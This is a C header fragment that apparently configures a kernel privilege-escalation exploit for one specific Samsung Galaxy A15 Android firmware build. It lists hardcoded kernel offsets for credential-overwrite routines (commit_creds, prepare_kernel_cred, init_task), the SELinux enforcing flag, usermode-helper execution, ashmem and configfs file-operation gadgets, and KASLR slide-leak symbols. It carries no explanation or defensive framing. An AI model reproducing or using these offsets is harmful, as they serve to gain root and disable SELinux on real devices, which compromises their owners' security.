 ...
 * ------------------------------------------------------------------------- */
#define BUILD_VARIANT_LABEL "a15x-S156VUDSBDZDC-app"
#define PHYS_P0_ORACLE 1
#define SLIDE_ROUTE SLIDE_ROUTE_FPSIMD

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a15xtfn/a15x:16/BP2A.250605.031.A3/S156VUDSBDZDC:user/release-keys"
#endif
...
#define P0_FINGERPRINT_HEADER \
  "targets/a15x-S156VUDSBDZDC/p0_fingerprint.h"
...
#define SLIDE_KASLR_STEP 0x10000ULL
#define SLIDE_TRACEFS_EVENT_ID 108
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0010d9e8ULL
 ...
 * ------------------------------------------------------------------------- */
/* --- global / root symbols ------------------------------------------------ */
#define INIT_TASK_OFF                       0x02a49040ULL
#define PREPARE_KERNEL_CRED_OFF             0x0011e298ULL
#define COMMIT_CREDS_OFF                    0x0011fea0ULL
#define OVERRIDE_CREDS_OFF                  0x0011efdcULL
#define ROOT_TASK_GROUP_OFF                 0x02af8ac0ULL
#define SELINUX_ENFORCING_OFF               0x02bcce88ULL
#define KMALLOC_CACHES_OFF                  0x01f1ab88ULL
#define ANON_PIPE_BUF_OPS_OFF               0x01d5ade0ULL
#define SYSTEM_UNBOUND_WQ_OFF               0x028e07d8ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF   0x00104474ULL

/* --- ashmem / configfs / fops gadgets ------------------------------------- */
#define ASHMEM_FOPS_OFF                     0x01ec4050ULL
#define ASHMEM_MISC_FOPS_OFF                0x02a40f28ULL
#define ASHMEM_IOCTL_OFF                    0x0105430cULL
#define ASHMEM_COMPAT_IOCTL_OFF             0x01054968ULL
#define ASHMEM_MMAP_OFF                     0x010549c0ULL
#define ASHMEM_OPEN_OFF                     0x01054ca0ULL
#define ASHMEM_RELEASE_OFF                  0x01054d38ULL
#define ASHMEM_SHOW_FDINFO_OFF              0x01054e54ULL
#define CONFIGFS_READ_ITER_OFF              0x005d095cULL
#define CONFIGFS_BIN_WRITE_ITER_OFF         0x005d1384ULL
#define COPY_SPLICE_READ_OFF                0x005246f4ULL
#define NOOP_LLSEEK_OFF                     0x004b8bf0ULL

/* --- slide leak symbols ---------------------------------------------------- */
#define SLIDE_NFULNL_LOGGER_NAME_OFF              0x01c52babULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF            0x028e1e28ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF   0x029fef18ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF                   0x02c6da21ULL
